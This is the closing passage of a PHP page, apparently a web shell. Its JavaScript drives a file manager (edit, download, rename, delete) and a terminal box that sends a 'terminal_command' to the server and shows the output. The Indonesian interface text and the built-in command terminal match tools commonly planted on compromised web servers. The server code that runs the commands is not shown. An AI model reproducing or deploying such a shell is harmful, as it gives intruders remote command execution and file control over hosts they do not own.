    <?php endif; ?>

    <script>
        const cm = document.getElementById('contextMenu');
        let selItem = ''; let isDir = false;

        document.querySelectorAll('.file-row').forEach(row => {
            row.addEventListener('contextmenu', e => {
                e.preventDefault(); selItem = row.getAttribute('data-name'); isDir = row.getAttribute('data-isdir') === '1';
                cm.style.display = 'block'; cm.style.left = e.pageX + 'px'; cm.style.top = e.pageY + 'px';
            });
        });

        window.onclick = () => { cm.style.display = 'none'; };
        document.getElementById('cmEdit').onclick = () => { if(!isDir) window.location.href = '?path=<?= urlencode($currentPath) ?>&edit=' + encodeURIComponent(selItem); };
        document.getElementById('cmDownload').onclick = () => { if(!isDir) window.location.href = '?path=<?= urlencode($currentPath) ?>&download=' + encodeURIComponent(selItem); };
        document.getElementById('cmRename').onclick = () => trigR(selItem);
        document.getElementById('cmDelete').onclick = () => trigD(selItem);

        function toggleTerminal() { const t = document.getElementById('terminalModal'); t.classList.toggle('active'); if(t.classList.contains('active')) document.getElementById('termInput').focus(); }

        document.getElementById('termInput').addEventListener('keydown', function(e) {
            if (e.key === 'Enter') {
                const cmd = this.value; const out = document.getElementById('termOutput');
                out.innerHTML += "\n<span style='color:var(--gold)'># " + cmd + "</span>"; this.value = '';
                fetch('', { method:'POST', headers:{'Content-Type':'application/x-www-form-urlencoded'}, body:'terminal_command='+encodeURIComponent(cmd) })
                .then(r => r.text()).then(data => { out.innerHTML += "\n" + data; out.scrollTop = out.scrollHeight; });
            }
        });

        function openM(id){ document.getElementById(id).classList.add('active'); }
        function closeM(id){ document.getElementById(id).classList.remove('active'); }
        function trigR(n){ document.getElementById('rOld').value = n; document.getElementById('rNew').value = n; openM('mRename'); }
        function trigD(n){ if(confirm('Hapus ' + n + '?')) window.location.href='?path=<?= urlencode($currentPath) ?>&delete='+encodeURIComponent(n); }
    </script>
</body>
</html>
